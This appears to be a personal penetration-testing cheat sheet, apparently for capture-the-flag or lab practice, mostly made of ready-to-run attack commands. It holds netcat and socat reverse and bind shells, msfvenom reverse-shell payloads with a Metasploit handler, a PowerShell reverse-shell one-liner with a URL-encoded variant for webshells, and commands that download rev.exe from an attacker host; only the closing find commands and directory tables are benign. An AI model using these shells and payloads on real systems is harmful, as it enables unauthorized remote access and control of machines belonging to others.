# SUMMARY OF SCRIPTS AND USER CASES

## NMAP 
```
sudo nmap -sS -sV -sC -T4 --min-rate 8888 $TARGET -vv
# -sS: stealth
# -sC: scripting
# -sV: service detection
# -T4: aggresiveness
# --min-rate: packet strength 

nmap -sV --script=http-enum $TARGET
```
## NETCAT 
```
#REVERSE SHELL 
nc -lvnp <port-number>
# -l: listen
# -v: verbose
# -n: no dns resolve
# -p: specify port
nc -lvnp 4444

#BIND SHELL
nc <target-ip> <port-number>
# This will connect to the listener
nc 10.10.10.10 4444
```

**STABILIZE SHELL**. 
```
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
`Ctrl + z` 
ssty raw -echo; fg
```


**BIND SHELL PRACTICE for netcat without -e**
```
PORT=4444
mkfifo /tmp/f; nc -lvnp $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# ATTACKER MACHINE WILL HAVE TO CONNECT TO VICTIM 
```

**REVERSE SHELL PRACTICE for netcat without -e**
```
IP=10.10.93.13
PORT=4444
mkfifo /tmp/f; nc $IP $PORT < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# VICTIM MACHINE WILL CONNECT TO YOU, SO ATTACKER MACHINE SHOULD HAVE LISTENER OPEN BEFORE CONNECTION 
```

## SOCAT ENCRYPTED SHELLS
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt 
cat shell.crt shell.key > shell.pem


# TO START THE ENCRYPTED LISTENER
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -

# TO CONNECT TO THE LISTENER
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

## MSFVENOM 

Windows
```
# STAGED
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe

# STAGELESS
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```

LINUX
```
# STAGED 
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
# STAGELESS 
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
```

Once payload is created. Run multi handler 
```
msfconsole -q
use multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
exploit -j # To run as background job 
```


```
Find files:

find . -name flag1.txt: find the file named “flag1.txt” in the current directory
find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
find / -type d -name config: find the directory named config under “/”
find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
find / -perm a=x: find executable files
find /home -user frank: find all files for user “frank” under “/home”
find / -mtime 10: find files that were modified in the last 10 days
find / -atime 10: find files that were accessed in the last 10 day
find / -cmin -60: find files changed within the last hour (60 minutes)
find / -amin -60: find files accesses within the last hour (60 minutes)
find / -size 50M: find files with a 50 MB size
```

note always add `2>/dev/null` so you can filter the errors 
```

find / -writable -type d 2>/dev/null : Find world-writeable folders
find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
```

after entering 
clone this 
https://github.com/mzet-/linux-exploit-suggester and use it 


## POWERSHELL
> CHANGE `<ip>` and `<port>`
  
  
One liner reverse shell 
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

same one liner reverse shell but url encoded for webshells
```powershell
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

DownloadFile 
```
Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' -OutFile '.\rev.exe'
```
## CMD

search files in all directories and subdirectories of the current drive
```
dir /s root.txt
```

Download Files
```
@echo off
bitsadmin /transfer myDownloadJob /download /priority high http://10.10.167.187:8888/rev.exe %cd%\rev.exe
```
Download file in Batch Via Powershell Module
```
powershell -command "Invoke-WebRequest -Uri 'http://10.10.167.187:8888/rev.exe' -OutFile '.\rev.exe'"
```


## Operating Systems

### Linux

| Directory | Description                                                                            |
|-----------|----------------------------------------------------------------------------------------|
| /         | The root directory, the top-level directory in the filesystem.                         |
| /bin      | Contains essential user command binaries.                                              |
| /boot     | Contains the files needed to boot the system, such as the kernel and bootloader.       |
| /dev      | Contains device files representing hardware and software devices.                      |
| /etc      | Contains system-wide configuration files and directories.                              |
| /home     | Contains user home directories.                                                        |
| /lib      | Contains shared libraries needed by system programs.                                   |
| /media    | Mount point for removable media, such as USB drives and CDs.                           |
| /mnt      | Mount point for temporarily mounted filesystems.                                       |
| /opt      | Contains optional application software packages.                                       |
| /proc     | A virtual filesystem that provides process and kernel information.                     |
| /root     | The home directory of the root user.                                                   |
| /sbin     | Contains essential system binaries, mostly for administration.                         |
| /srv      | Contains data for services provided by the system.                                     |
| /sys      | A virtual filesystem that provides information about the kernel, devices, and drivers. |
| /tmp      | Contains temporary files that can be used by applications.                             |
| /usr      | Contains read-only user data, including binaries, libraries, and documentation.        |
| /var      | Contains variable data, such as logs, databases, and mail.                             |u

### Windows 

| Directory              | Description                                                                         |
|------------------------|-------------------------------------------------------------------------------------|
| C:\                    | The root directory, the top-level directory in the filesystem.                      |
| C:\Program Files       | Contains application software installed for all users.                              |
| C:\Program Files (x86) | Contains 32-bit application software on 64-bit systems.                             |
| C:\ProgramData         | Contains application data shared by all users.                                      |
| C:\Users               | Contains user profiles, including Documents, Downloads, and other personal folders. |
| C:\Windows             | Contains the Windows operating system files.                                        |
| C:\Windows\System32    | Contains essential system files, including executables, DLLs, and drivers.          |
| C:\Windows\SysWOW64    | Contains 32-bit system files on 64-bit systems.                                     |
| C:\Windows\Temp        | Contains temporary files that can be used by applications and the system.           |

